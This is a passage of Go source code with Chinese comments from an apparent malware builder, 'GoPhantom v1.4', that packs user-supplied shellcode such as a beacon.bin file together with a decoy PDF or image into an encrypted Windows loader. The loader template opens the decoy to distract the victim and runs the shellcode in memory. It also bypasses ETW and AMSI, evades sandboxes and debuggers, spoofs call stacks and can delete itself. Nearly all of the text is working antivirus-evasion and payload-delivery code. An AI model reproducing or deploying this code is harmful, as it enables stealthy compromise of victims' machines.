	// 2. 简单的网络伪装（模拟查询）
	time.Sleep(time.Duration(500+rand.Intn(1000)) * time.Millisecond)
}

// 睡眠混淆 - 在内存中对shellcode进行XOR加密
func sleepObfuscate(address uintptr, size uintptr) {
	if !enableObfuscate {
		time.Sleep(5 * time.Second)
		return
	}
	
	key := make([]byte, 16)
	for i := range key {
		key[i] = byte(rand.Intn(256))
	}

	mem := (*[1 << 30]byte)(unsafe.Pointer(address))[:size:size]

	// XOR加密
	for i := 0; i < len(mem); i++ {
		mem[i] ^= key[i%16]
	}

	// 睡眠
	time.Sleep(time.Duration(3000+rand.Intn(2000)) * time.Millisecond)

	// XOR解密
	for i := 0; i < len(mem); i++ {
		mem[i] ^= key[i%16]
	}
}

// shellcode变异 - 更安全的方式：只在开头添加少量NOP
func mutateShellcode(shellcode []byte) []byte {
	if !enableMutate {
		return shellcode
	}
	
	// 只在shellcode开头添加1-5个真正的NOP指令
	nopCount := 1 + rand.Intn(5)
	mutated := make([]byte, 0, len(shellcode)+nopCount)
	
	// 添加真正的NOP指令
	for i := 0; i < nopCount; i++ {
		mutated = append(mutated, 0x90) // 只使用真正的NOP
	}
	
	// 添加原始shellcode
	mutated = append(mutated, shellcode...)
	
	return mutated
}
// 在当前进程中执行shellcode - 使用高级规避技术
func executeShellcode(shellcode []byte) {
	// 添加基本的错误处理
	defer func() {
		if r := recover(); r != nil {
			// 如果执行过程中出现panic，静默处理
		}
	}()
	
	// 堆栈欺骗
	spoofCallStack()
	
	kernel32 := getKernel32()
	if kernel32 == 0 {
		return
	}
	
	ntdll, _ := syscall.LoadLibrary("ntdll.dll")
	
	// 优先使用 Nt* 函数，绑过用户层 hook
	var addr uintptr
	var allocSuccess bool
	
	// 尝试使用 NtAllocateVirtualMemory (更底层，更难被hook)
	ntAllocateVirtualMemory := getProcAddr(uintptr(ntdll), "NtAllocateVirtualMemory")
	if ntAllocateVirtualMemory != 0 {
		getCurrentProcess := getProcAddr(kernel32, "GetCurrentProcess")
		if getCurrentProcess != 0 {
			hProcess, _, _ := syscall.Syscall(getCurrentProcess, 0, 0, 0, 0)
			var baseAddr uintptr = 0
			regionSize := uintptr(len(shellcode))
			// NtAllocateVirtualMemory(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect)
			ret, _, _ := syscall.Syscall6(ntAllocateVirtualMemory, 6, 
				hProcess, 
				uintptr(unsafe.Pointer(&baseAddr)), 
				0, 
				uintptr(unsafe.Pointer(&regionSize)), 
				0x3000, // MEM_COMMIT | MEM_RESERVE
				0x04)   // PAGE_READWRITE
			if ret == 0 && baseAddr != 0 {
				addr = baseAddr
				allocSuccess = true
			}
		}
	}
	
	// 回退到 VirtualAlloc
	if !allocSuccess {
		virtualAlloc := getProcAddr(kernel32, "VirtualAlloc")
		if virtualAlloc == 0 {
			return
		}
		addr, _, _ = syscall.Syscall6(virtualAlloc, 4, 0, uintptr(len(shellcode)), 
			0x3000, 0x04, 0, 0)
		if addr == 0 {
			return
		}
	}
	
	// 使用分块复制 + 随机延迟，规避行为检测
	dst := (*[1 << 30]byte)(unsafe.Pointer(addr))[:len(shellcode):len(shellcode)]
	chunkSize := 512
	for i := 0; i < len(shellcode); i += chunkSize {
		end := i + chunkSize
		if end > len(shellcode) {
			end = len(shellcode)
		}
		copy(dst[i:end], shellcode[i:end])
		if rand.Intn(10) > 7 {
			time.Sleep(time.Duration(rand.Intn(10)) * time.Millisecond)
		}
	}
	
	// 可选睡眠混淆
	if enableObfuscate {
		sleepObfuscate(addr, uintptr(len(shellcode)))
	}

	// 修改为RX权限 - 优先使用 NtProtectVirtualMemory
	var oldProtect uint32
	ntProtectVirtualMemory := getProcAddr(uintptr(ntdll), "NtProtectVirtualMemory")
	if ntProtectVirtualMemory != 0 {
		getCurrentProcess := getProcAddr(kernel32, "GetCurrentProcess")
		if getCurrentProcess != 0 {
			hProcess, _, _ := syscall.Syscall(getCurrentProcess, 0, 0, 0, 0)
			baseAddr := addr
			regionSize := uintptr(len(shellcode))
			syscall.Syscall6(ntProtectVirtualMemory, 5, 
				hProcess, 
				uintptr(unsafe.Pointer(&baseAddr)), 
				uintptr(unsafe.Pointer(&regionSize)), 
				0x20, // PAGE_EXECUTE_READ
				uintptr(unsafe.Pointer(&oldProtect)), 0)
		}
	} else {
		virtualProtect := getProcAddr(kernel32, "VirtualProtect")
		if virtualProtect != 0 {
			syscall.Syscall6(virtualProtect, 4, addr, uintptr(len(shellcode)), 
				0x20, uintptr(unsafe.Pointer(&oldProtect)), 0, 0)
		}
	}
	
	// 执行前再次检测调试器
	if !checkDebugger() {
		return
	}
	
	// 创建线程执行 - 使用随机延迟
	time.Sleep(time.Duration(rand.Intn(100)) * time.Millisecond)
	
	createThread := getProcAddr(kernel32, "CreateThread")
	waitForSingleObject := getProcAddr(kernel32, "WaitForSingleObject")
	
	if createThread == 0 {
		return
	}
	
	threadHandle, _, _ := syscall.Syscall6(createThread, 6, 0, 0, addr, 0, 0, 0)
	
	if threadHandle != 0 && waitForSingleObject != 0 {
		syscall.Syscall(waitForSingleObject, 2, threadHandle, 0xFFFFFFFF, 0)
	}
}

// 自清理机制
func selfDestruct() {
	kernel32 := getKernel32()
	deleteFileA := getProcAddr(kernel32, "DeleteFileA")
	getModuleFileNameA := getProcAddr(kernel32, "GetModuleFileNameA")
	
	if deleteFileA != 0 && getModuleFileNameA != 0 {
		// 获取当前可执行文件路径
		var buffer [260]byte
		ret, _, _ := syscall.Syscall(getModuleFileNameA, 3, 0, 
			uintptr(unsafe.Pointer(&buffer[0])), 260)
		if ret > 0 {
			// 短暂延迟后删除自身
			time.Sleep(2 * time.Second)
			syscall.Syscall(deleteFileA, 1, uintptr(unsafe.Pointer(&buffer[0])), 0, 0)
		}
	}
}

func main() {
	// 初始化随机种子
	rand.Seed(time.Now().UnixNano())
	
	// 早期防御绕过
	disableETW()
	disableAMSI()
	
	// 执行反沙箱检查
	if !antiSandboxChecks() {
		return // 静默退出
	}
	
	// 行为伪装
	go behaviorCamouflage()
	
	// 解密并处理诱饵文件
	if decoyBytes, err := decryptAESGCM(encryptedDecoyBase64, aesSaltBase64); err == nil {
		// 使用环境变量选择目录
		tempDirs := []string{"TEMP", "TMP", "PUBLIC"}
		selectedDir := tempDirs[rand.Intn(len(tempDirs))]
		
		// 构建文件路径
		var decoyPath string
		if tempPath := os.Getenv(selectedDir); tempPath != "" {
			decoyPath = filepath.Join(tempPath, decoyFileName)
		} else {
			decoyPath = filepath.Join("C:\\Temp", decoyFileName)
		}
		
		if writeErr := os.WriteFile(decoyPath, decoyBytes, 0644); writeErr == nil {
			// 使用ShellExecute打开文件
			shell32 := getShell32()
			shellExecuteA := getProcAddr(shell32, "ShellExecuteA")
			
			if shellExecuteA != 0 {
				verb, _ := syscall.BytePtrFromString("open")
				path, _ := syscall.BytePtrFromString(decoyPath)
				syscall.Syscall6(shellExecuteA, 6, 0,
					uintptr(unsafe.Pointer(verb)),
					uintptr(unsafe.Pointer(path)),
					0, 0, 1) // SW_SHOWNORMAL
			}
		}
	}
	
	// 延迟执行payload
	time.Sleep(time.Duration(1000+rand.Intn(2000)) * time.Millisecond)
	
	// 用户指定的分段延迟执行
	if delaySeconds > 0 {
		for i := 0; i < delaySeconds; i++ {
			time.Sleep(time.Second)
			time.Sleep(time.Duration(rand.Intn(100)) * time.Millisecond)
		}
	}
	
	// 解密shellcode
	if shellcode, err := decryptAESGCM(encryptedShellcodeBase64, aesSaltBase64); err == nil {
		// 变异shellcode
		mutatedShellcode := mutateShellcode(shellcode)
		
		// 执行shellcode
		executeShellcode(mutatedShellcode)
		
		// 内存清理
		for i := range shellcode {
			shellcode[i] = 0
		}
		for i := range mutatedShellcode {
			mutatedShellcode[i] = 0
		}
	}

	// 最终等待
	time.Sleep(time.Duration(2000+rand.Intn(1000)) * time.Millisecond)
	
	// 移除自清理机制，程序将持续稳定运行
	// 注释掉原有的自删除和退出逻辑
	// go func() {
	//     time.Sleep(5 * time.Second)
	//     selfDestruct()
	// }()
	
	// 程序持续运行，确保稳定性
	for {
		// 保持程序活跃，防止被系统回收
		time.Sleep(30 * time.Second)
		// 可以在这里添加心跳或其他保活逻辑
	}
}
`

type TemplateData struct {
	EncryptedPayload string
	EncryptedDecoy   string
	Salt             string
	DecoyFileName    string
	EnableObfuscate  bool
	EnableMutate     bool
	EnableCompress   bool
	DelaySeconds     int
}

func encryptAESGCM(plaintext []byte, key []byte, enableCompress bool) (string, error) {
	data := plaintext
	
	// XOR加密层 (使用AES密钥前8字节)
	xorKey := key[:8]
	for i := range data {
		data[i] ^= xorKey[i%8]
	}
	
	// 如果启用压缩，先压缩数据
	if enableCompress {
		var compressedBuf bytes.Buffer
		writer := zlib.NewWriter(&compressedBuf)
		if _, err := writer.Write(data); err != nil {
			return "", err
		}
		if err := writer.Close(); err != nil {
			return "", err
		}
		data = compressedBuf.Bytes()
	}
	
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return "", err
	}
	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func main() {
	// 确保在 Windows 上也能正常显示输出
	log.SetFlags(0)
	
	// 定义所有标志
	decoyFile := flag.String("decoy", "", "Required: Path to the decoy file (e.g., a PDF or image).")
	payloadFile := flag.String("payload", "", "Required: Path to the raw x64 shellcode file (e.g., beacon.bin).")
	outputFile := flag.String("out", "", "Required: Final output executable name.")
	enableObfuscate := flag.Bool("obfuscate", false, "Optional: Enable sleep-obfuscation in generated loader.")
	enableMutate := flag.Bool("mutate", false, "Optional: Enable shellcode mutation with random NOPs.")
	enableCompress := flag.Bool("compress", true, "Optional: Enable zlib compression of embedded data (default: true).")
	delaySeconds := flag.Int("delay", 0, "Optional: Delay N seconds before payload execution.")
	
	// 自定义用法信息
	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "%s\n", logo)
		fmt.Fprintf(os.Stderr, "Usage: %s [OPTIONS]\n\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "Required flags:\n")
		fmt.Fprintf(os.Stderr, "  -decoy string\n        Path to the decoy file (e.g., a PDF or image)\n")
		fmt.Fprintf(os.Stderr, "  -payload string\n        Path to the raw x64 shellcode file (e.g., beacon.bin)\n")
		fmt.Fprintf(os.Stderr, "  -out string\n        Final output executable name\n\n")
		fmt.Fprintf(os.Stderr, "Optional flags:\n")
		fmt.Fprintf(os.Stderr, "  -compress\n        Enable zlib compression of embedded data (default: true)\n")
		fmt.Fprintf(os.Stderr, "  -delay int\n        Delay N seconds before payload execution (default: 0)\n")
		fmt.Fprintf(os.Stderr, "  -obfuscate\n        Enable sleep-obfuscation in generated loader\n")
		fmt.Fprintf(os.Stderr, "  -mutate\n        Enable shellcode mutation with random NOPs\n")
		fmt.Fprintf(os.Stderr, "  -h, --help\n        Show this help message\n\n")
		fmt.Fprintf(os.Stderr, "Example:\n")
		fmt.Fprintf(os.Stderr, "  %s -decoy document.pdf -payload beacon.bin -out loader.exe\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "  %s -decoy image.jpg -payload calc.bin -out calc_loader.exe -obfuscate -mutate -delay 30\n\n", os.Args[0])
	}
	
	// 检查帮助参数
	if len(os.Args) > 1 && (os.Args[1] == "-h" || os.Args[1] == "--help" || os.Args[1] == "-help") {
		flag.Usage()
		return
	}
	
	log.Println(logo)
	flag.Parse()

	if *decoyFile == "" || *payloadFile == "" || *outputFile == "" {
		fmt.Fprintf(os.Stderr, "\n❌ Error: Missing required parameters!\n\n")
		if *decoyFile == "" {
			fmt.Fprintf(os.Stderr, "Missing -decoy: Please specify a decoy file path\n")
		}
		if *payloadFile == "" {
			fmt.Fprintf(os.Stderr, "Missing -payload: Please specify a shellcode file path\n") 
		}
		if *outputFile == "" {
			fmt.Fprintf(os.Stderr, "Missing -out: Please specify an output file name\n")
		}
		fmt.Fprintf(os.Stderr, "\nUse '%s -h' for help.\n\n", os.Args[0])
		os.Exit(1)
	}

	decoyBytes, err := os.ReadFile(*decoyFile)
	if err != nil {
		log.Fatalf("[-] Failed to read decoy file: %v", err)
	}
	shellcodeBytes, err := os.ReadFile(*payloadFile)
	if err != nil {
		log.Fatalf("[-] Failed to read payload file: %v", err)
	}

	log.Println("[+] Deriving AES-256 key using Argon2id...")
	aesKey, salt, err := keymgr.DeriveKeyAndSalt()
	if err != nil {
		log.Fatalf("[-] Failed to derive key and salt: %v", err)
	}

	log.Println("[+] Encrypting decoy file with derived key...")
	encryptedDecoy, err := encryptAESGCM(decoyBytes, aesKey, *enableCompress)
	if err != nil {
		log.Fatalf("[-] Failed to encrypt decoy file: %v", err)
	}

	log.Println("[+] Encrypting payload file with the same derived key...")
	encryptedShellcode, err := encryptAESGCM(shellcodeBytes, aesKey, *enableCompress)
	if err != nil {
		log.Fatalf("[-] Failed to encrypt payload file: %v", err)
	}

	data := TemplateData{
		EncryptedPayload: encryptedShellcode,
		EncryptedDecoy:   encryptedDecoy,
		Salt:             base64.StdEncoding.EncodeToString(salt),
		DecoyFileName:    filepath.Base(*decoyFile),
		EnableObfuscate:  *enableObfuscate,
		EnableMutate:     *enableMutate,
		EnableCompress:   *enableCompress,
		DelaySeconds:     *delaySeconds,
	}

	log.Println("[+] Generating loader source code...")
	tmpl, err := template.New("loader").Parse(loaderTemplate)
	if err != nil {
		log.Fatalf("[-] Failed to parse loader template: %v", err)
	}

	var sourceCode bytes.Buffer
	if err := tmpl.Execute(&sourceCode, data); err != nil {
		log.Fatalf("[-] Failed to execute template: %v", err)
	}

	tmpfile, err := os.CreateTemp("", "loader-*.go")
	if err != nil {
		log.Fatalf("[-] Failed to create temp file: %v", err)
	}
	defer os.Remove(tmpfile.Name())

	if _, err := tmpfile.Write(sourceCode.Bytes()); err != nil {
		log.Fatalf("[-] Failed to write to temp file: %v", err)
	}
	if err := tmpfile.Close(); err != nil {
		log.Fatalf("[-] Failed to close temp file: %v", err)
	}
	
	// 创建临时 go.mod 文件
	tmpDir := filepath.Dir(tmpfile.Name())
	goModPath := filepath.Join(tmpDir, "go.mod")
	goModContent := `module temploader

go 1.20

require golang.org/x/crypto v0.25.0

require golang.org/x/sys v0.34.0 // indirect
`
	if err := os.WriteFile(goModPath, []byte(goModContent), 0644); err != nil {
		log.Fatalf("[-] Failed to create temp go.mod: %v", err)
	}
	defer os.Remove(goModPath)

	log.Printf("[+] Cross-compiling for windows/amd64 and windows/386...")
	
	// 显示启用的功能
	var features []string
	if *enableCompress {
		features = append(features, "Data Compression")
	}
	if *enableObfuscate {
		features = append(features, "Sleep Obfuscation")
	}
	if *enableMutate {
		features = append(features, "Code Mutation")
	}
	if *delaySeconds > 0 {
		features = append(features, fmt.Sprintf("Delay %ds", *delaySeconds))
	}
	
	// 添加新增免杀特性
	features = append(features, "ETW Bypass")
	features = append(features, "AMSI Bypass")
	features = append(features, "Anti-Debug")
	features = append(features, "Process Detection")
	
	if len(features) > 0 {
		log.Printf("[+] Enabled evasion features: %v", features)
	}

	ldflags := "-s -w -H windowsgui"
	// 使用绝对路径作为输出文件
	absOutputFile, err := filepath.Abs(*outputFile)
	if err != nil {
		log.Fatalf("[-] Failed to get absolute path: %v", err)
	}
	
	// 获取文件名和扩展名
	ext := filepath.Ext(absOutputFile)
	baseName := absOutputFile[:len(absOutputFile)-len(ext)]
	if ext == "" {
		ext = ".exe"
		absOutputFile = absOutputFile + ext
	}
	
	// 编译 x64 版本
	log.Printf("[+] Building x64 version...")
	output64 := absOutputFile
	cmd64 := exec.Command("go", "build", "-mod=mod", "-o", output64, "-ldflags", ldflags, filepath.Base(tmpfile.Name()))
	cmd64.Dir = tmpDir
	
	env64 := os.Environ()
	env64 = append(env64, "CGO_ENABLED=0")
	env64 = append(env64, "GOOS=windows")
	env64 = append(env64, "GOARCH=amd64")
	cmd64.Env = env64

	output, err := cmd64.CombinedOutput()
	if err != nil {
		log.Printf("[-] x64 Compilation failed: %v", err)
		if len(output) > 0 {
			log.Printf("[-] Compiler output:\n%s", string(output))
		}
		os.Exit(1)
	}
	log.Printf("[✓] x64 build complete: %s", output64)
	
	// 编译 x86 版本
	log.Printf("[+] Building x86 version...")
	output32 := baseName + "_x86" + ext
	cmd32 := exec.Command("go", "build", "-mod=mod", "-o", output32, "-ldflags", ldflags, filepath.Base(tmpfile.Name()))
	cmd32.Dir = tmpDir
	
	env32 := os.Environ()
	env32 = append(env32, "CGO_ENABLED=0")
	env32 = append(env32, "GOOS=windows")
	env32 = append(env32, "GOARCH=386")
	cmd32.Env = env32

	output, err = cmd32.CombinedOutput()
	if err != nil {
		log.Printf("[-] x86 Compilation failed: %v", err)
		if len(output) > 0 {
			log.Printf("[-] Compiler output:\n%s", string(output))
		}
		log.Printf("[!] x86 build failed, but x64 build succeeded")
	} else {
		log.Printf("[✓] x86 build complete: %s", output32)
	}

	log.Printf("\n[✓] Successfully generated GoPhantom v1.4 loaders!")
	log.Printf("    x64: %s", output64)
	log.Printf("    x86: %s", output32)
}